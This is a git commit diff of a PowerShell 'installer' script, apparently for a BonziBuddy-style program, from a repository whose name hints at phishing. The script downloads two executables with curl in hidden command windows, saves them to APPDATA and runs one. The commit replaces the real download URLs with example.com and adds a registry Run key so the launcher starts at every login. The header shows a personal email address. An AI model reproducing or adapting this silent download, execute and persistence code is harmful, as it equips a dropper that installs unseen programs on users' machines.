c4fa2f1f4eecf907c3aba1bd3ca0a192dc0a5cff
sexxyred6767 <colin.t.hughes21@gmail.com>
2025-11-25 22:40:30 -0500

    Update Installer-Bonsi.ps1

--- Installer-Bonsi.ps1
+++ Installer-Bonsi.ps1
@@ -4,18 +4,23 @@ $dest1 = "$env:APPDATA\Launcher(Bonsi).exe"
 
 # Download Launcher(Bonsi).exe
 Start-Process "cmd.exe" `
-    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/djgkjd/Launcher.Bonsi.exe"" -o `"$dest1`"" `
+    -ArgumentList "/c curl -L ""https://example.com/Launcher.exe"" -o `"$dest1`"" `
     -WindowStyle Hidden `
     -Wait
 
 # Download BonsiBuddy.exe
 Start-Process "cmd.exe" `
-    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/bro/BonsiBuddy.exe"" -o `"$dest`"" `
+    -ArgumentList "/c curl -L ""https://example.com/BonsiBuddy.exe"" -o `"$dest`"" `
     -WindowStyle Hidden `
     -Wait
 
-# Run Launcher(Bonsi).exe
+# Add launcher to startup (HKCU Run)
+Set-ItemProperty `
+    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "BonsiLauncher" `
+    -Value "`"$dest1`""
+
+# Run launcher
 Start-Process $dest1
 
 exit
-
